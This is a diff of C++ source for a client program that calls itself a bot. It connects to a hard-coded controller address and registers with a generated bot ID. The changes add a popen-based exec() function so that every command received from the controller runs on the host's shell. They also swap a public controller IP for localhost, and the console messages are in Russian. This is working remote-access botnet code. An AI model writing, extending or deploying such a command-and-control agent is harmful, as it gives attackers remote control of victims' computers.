@@ -5,25 +5,26 @@
 #include <ctime>
 #include <thread>
 #include <chrono>
-#include <random> 
-
+#include <random>
+#include <array>
+#include <memory>
+#include <stdexcept>
 #ifdef _WIN32
 #include <winsock2.h>
-#include <ws2tcpip.h> 
+#include <ws2tcpip.h>
+#include <windows.h>
 #pragma comment(lib, "ws2_32.lib")
 #else
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
-#define SOCKET int
-#define INVALID_SOCKET -1
-#define SOCKET_ERROR -1
+#include <stdio.h>
 #endif
 
 using namespace std;
 
-const string CONTROLLER_IP = "81.200.153.234";
+const string CONTROLLER_IP = "127.0.0.1";
 const int CONTROLLER_PORT = 12345;
 
 #ifdef _WIN32
@@ -47,6 +48,34 @@ string generate_bot_id() {
 }
 
 string BOT_ID = generate_bot_id();
+
+#ifdef _WIN32
+string exec (const char* cmd){
+    array < char, 128 > buffer;
+    string result;
+    unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
+    if (!pipe){
+        throw runtime_error("popen() failed");
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
+#else
+string exec(const char* cmd) {
+    array<char, 128> buffer;
+    string result;
+    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
+    if (!pipe) {
+        throw std::runtime_error("popen() failed!");
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
+#endif
 
 bool register_with_controller(SOCKET& sock) {
     try {
@@ -128,6 +157,7 @@ void execute_command(const string& command) {
     }
 }
 
+
 int main() {
     setlocale(LC_ALL, "RUS");
 
@@ -154,14 +184,23 @@ int main() {
         return 1;
     }
 
+
     while (true) {
         char buffer[1024];
         int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
 
         if (bytes_received > 0) {
             buffer[bytes_received] = '\0';
-            cout << "Получена команда: " << buffer << endl;
-            execute_command(buffer);
+            string command(buffer);
+            cout << "Получена команда: " << command << endl;
+
+            try {
+                string result = exec(command.c_str());
+                cout << "Результат выполнения команды:\n" << result << endl;
+            }
+            catch (const std::runtime_error& e) {
+                cerr << "Ошибка при выполнении команды: " << e.what() << endl;
+            }
         }
         else if (bytes_received == 0) {
             cout << "Контроллер отключился." << endl;
